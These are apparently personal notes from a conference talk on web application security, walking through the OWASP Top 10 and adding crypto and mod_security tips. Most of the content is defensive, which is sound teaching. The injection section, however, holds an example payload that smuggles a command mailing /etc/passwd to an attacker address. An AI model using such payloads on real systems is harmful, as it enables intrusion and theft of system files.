Application Security

Aaron Bedra

(I got here 15 minutes late... hallway track kept me up)


# OWASP Top 10

In reverse order (10 is hoogityboogity bad)


1. Unvalidated redirects and forwards

  - /session/new?redirect-http://evil.com
  - and evil.com is a web form that looks exactly like the one the user just entered
  - so user enters their credentials again

  - How to defend:
    - don't involve user values in redirect
    - use mapping value and keep a lookup table
    - parse value into url and check host whitelist, i.e. new URL(redirect) and validate that object against a known good hostlist


2. keep up on security patches

  - monitor security of components... OS, languages, etc
  - sign up for mailing lists
  - http://oss-security.openwall.org/wiki/mailing-lists/oss-security
  - Establish protocol for security updates


3. CSRF

  - "confused deputy problem" -- the browser is the confused deputy
  - trick browser into abusing its authority
  - ideally the tricked user never knows they got duped

  - How to defend
    - Use your frameworks' CSRF protection
    - Include random token on each page
      - keep it in the session
      - check this token on submission


4. Missing function level access control

  - renamed; used to be "missing check on url action" or some such thing
  - can any old user get to /admin/home?
  - check access control on every page, not just hiding links or redirects behind authorization checks


5. Sensitive Data Exposure

  - big, ambiguous topic

  - his two points:

  1. storing sensitive data unknowingly
    - logs, eg storing passwords
    - exception emails
      - logging credit card numbers in the exception system, eg
    - avoid putting sensitive stuff in query string parameters, because it'll definitely show up in web logs
    - or putting sensitive information in query strings that link to other sites
      - because now that information has escaped out into the wild and into other sites

    -- passwords, SSN, Bank accounts, credit card numbers, oauth tokens


    - So:
     - never put sensitive params in query strings
     - check that logs and exceptions are filtered
     - be careful what you log

  1. password storage
    - don't do this: sha1(password)

    - it does have one desirable property: if you look directly in the database, you can't see what a password is

    - so it evolved: sha1(salt + password)
     - does defeat rainbow tables
     - forces focus on one password

     - undesirable: it's still very fast, so you can guess billions of passwords per second

    - We want slow
       -bcrypt, scrypt, pbkdf2
       - "adaptive hashing"

    - Delegate authentication when possible
     - facebook, twitter, google, github
     - though don't expect a bank to do this
    - store one way verifiers using bcrypt, scrypt, or pbdkf2
      - tune adaptive hash to servers
        - ratchet up the computation time depending on strength of server

6. Security misconfiguration

  - exposing error data, such as CF's extended debugging, or the .NET yellow screen of death
  - having services open on server
    - would turn up in an nmap scan
  - leaving components with default usernames / passwords


7. Insecure direct object references

  - GET /users/5
  - it's a bad thing if you can just change a url param and see something that you shouldn't be able to see
    - in this case, does the user have authorization to access user id 5

  - check out chrome's "copy as cURL", also copy as HAR for unrelated things

  - look into "tamper data"


8. XSS

  - steal cookies
    - unless httponly flag
  - redirect users to phishing site
  - siphon off data entered onto site
  - perform complicated csrf

  - How to prevent:
    - escape output
      - prefer an automated system
    - never trust user input

9. Broken authentication and session management

  - reminds us of firesheep, used on open wifi to sniff packets in the raw
  - when app sends along a session cookie in the clear, all you had to do was take that session cookie out, put it in your browser, and you are now that user
    - this is why you need SSL

  - How to prevent:

    - only transmit session cookies over ssl
      - flag cookies as secure
      - tells browser not to send cookie if browser isn't on ssl
    - ensure sessions timeout
    - rotate sessions on login
      - addresses session fixation
    - use http strict transport security
      - tells browser to always use SSL, even if user requests non-ssl version
      - you can work with browser vendors to have your site added by default on install


10. Injection

  - sql injection
  - os injection
    - so you pass a url/form param through to an os tool, like clamscan, but you escape it so it's like $foo&mail -t me@evil.com < /etc/passwd




# WebGoat

- I could not get this going on my machine... tomcat errors.
- Hell, I can't even run my own tomcat now. but it looks simple to get going: unzip webgoat, run webgoat.sh start8080, and go




# Crypto

keyczar from google, python and java - for doing crypto right, because straight java is so hard to get right
- anytime you new up an instance of a symmetric algorithm, you'll probably doing it wrong

nacl or salts is another (I think)

- don't use ECB mode in ciphers... python it's the default
  - check out the image of tux on wikipedia ecb mode page

- prefer cbc mode (cipher block chaining mode)



# Triage


- git grep raw, in a rails app, to find cases of raw being used

- what are the equivalent baddies in django?

- look into some of the tools here: http://www.opensourcetesting.org/security.php


#mod security

- module for apache, nginx, iis
- apache version most mature

- you're going to have to tune the heck out of it, because it's going to find a lot of things that it thinks are bad

- you can disable protection on specific paths and even fields in the rules files

- can turn on DetectOnly mode, which will log all the things but not block users